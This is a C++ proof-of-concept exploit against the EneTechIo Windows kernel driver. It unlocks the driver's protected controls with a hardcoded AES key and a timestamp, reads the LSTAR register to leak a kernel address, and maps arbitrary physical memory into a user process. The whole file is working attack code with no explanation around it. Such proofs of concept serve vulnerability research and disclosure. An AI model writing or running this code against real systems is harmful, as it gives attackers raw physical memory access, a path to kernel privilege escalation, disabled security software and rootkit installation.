#include <windows.h>
#include <cstdio>
#include "ntos.h"

#define WINIO_DEVICE_TYPE      (DWORD)0x8010 
#define WINIO_READMSR          (DWORD)0x816

#define IOCTL_WINIO_READMSR     \
    CTL_CODE(WINIO_DEVICE_TYPE, WINIO_READMSR, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define WINIO_MAP_FUNCID     (DWORD)0x810
#define WINIO_UNMAP_FUNCID   (DWORD)0x811

#define IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY     \
    CTL_CODE(WINIO_DEVICE_TYPE, WINIO_MAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102040

#define IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY   \
    CTL_CODE(WINIO_DEVICE_TYPE, WINIO_UNMAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102044


#ifdef __cplusplus
extern "C" {
#include "aes.h"
}
#endif

typedef struct _WINIO_PHYSICAL_MEMORY_INFO_EX {
    ULONG_PTR CommitSize;
    ULONG_PTR BusAddress;
    HANDLE SectionHandle;
    PVOID BaseAddress;
    PVOID ReferencedObject;
    UCHAR EncryptedKey[16];
} WINIO_PHYSICAL_MEMORY_INFO_EX, * PWINIO_PHYSICAL_MEMORY_INFO_EX;

typedef struct _WINIO_READ_MSR_INPUT {
    ULONG Msr;
    UCHAR EncryptedKey[16];
} WINIO_READ_MSR_INPUT, * PWINIO_READ_MSR_INPUT;

typedef struct _WINIO_READ_MSR_OUTPUT {
    ULONG MsrLow;
    UCHAR SpareBytes[16];
    ULONG MsrHigh;
} WINIO_READ_MSR_OUTPUT, * PWINIO_READ_MSR_OUTPUT;

ULONG g_UnlockKey[4] = { 0x54454E45, 0x4E484345, 0x474F4C4F, 0x434E4959 };

ULONG GetTimeAsSecondsSince1970()
{
    LARGE_INTEGER fileTime;
    ULONG seconds = 0;

    GetSystemTimePreciseAsFileTime((PFILETIME)&fileTime);
    RtlTimeToSecondsSince1970(&fileTime, &seconds);
    return seconds;
}

BOOL WinIoCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

PVOID WinIoMapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)&g_UnlockKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.CommitSize = NumberOfBytes;
    request.BusAddress = PhysicalAddress;

    ULONG seconds = GetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(seconds));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    if (WinIoCallDriver(DeviceHandle,
        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

VOID WinIoUnmapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)&g_UnlockKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    ULONG seconds = GetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(ULONG));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    WinIoCallDriver(DeviceHandle,
        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\EneTechIo"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }
    else {
        printf_s("[+] EneTechIo device opened\r\n");
    }

    AES_ctx ctx;
    WINIO_READ_MSR_INPUT* inBuf;
    WINIO_READ_MSR_OUTPUT* outBuf;

    PVOID dataPtr;
    BYTE inOutBuffer[512];


    RtlSecureZeroMemory(&inOutBuffer, sizeof(inOutBuffer));
    inBuf = (WINIO_READ_MSR_INPUT*)&inOutBuffer;
    outBuf = (WINIO_READ_MSR_OUTPUT*)&inOutBuffer;
    dataPtr = &inOutBuffer;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)&g_UnlockKey);

    inBuf->Msr = 0xC0000082;

    ULONG seconds = GetTimeAsSecondsSince1970();

    RtlCopyMemory(&inBuf->EncryptedKey, (PVOID)&seconds, sizeof(ULONG));
    AES_ECB_encrypt(&ctx, (uint8_t*)&inBuf->EncryptedKey);

    NTSTATUS ntStatus = WinIoCallDriver(deviceHandle,
        IOCTL_WINIO_READMSR,
        dataPtr,
        sizeof(WINIO_READ_MSR_INPUT),
        dataPtr,
        sizeof(WINIO_READ_MSR_OUTPUT));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Failed to read LSTAR, NTSTATUS (0x%lX)\r\n", ntStatus);
    }
    else {
        LARGE_INTEGER value;
        value.LowPart = outBuf->MsrLow;
        value.HighPart = outBuf->MsrHigh;
        printf_s("[+] IOCTL %lu succeeded, LSTAR = 0x%llx\r\n", IOCTL_WINIO_READMSR, value.QuadPart);
    }

    HANDLE sectionHandle;
    PVOID refObject;
    PVOID mappedMemory;

    mappedMemory = WinIoMapMemory2(deviceHandle,
        0x12000,
        1024 * 1024,
        &sectionHandle,
        &refObject);

    if (mappedMemory) {

        printf_s("[+] IOCTL %lu succeeded, physmem mapped\r\n", IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY);

        WinIoUnmapMemory2(deviceHandle,
            mappedMemory,
            sectionHandle,
            refObject);
    }
    else {
        printf_s("[!] Could not map physical memory\r\n");
    }

    CloseHandle(deviceHandle);

    return 0;
}
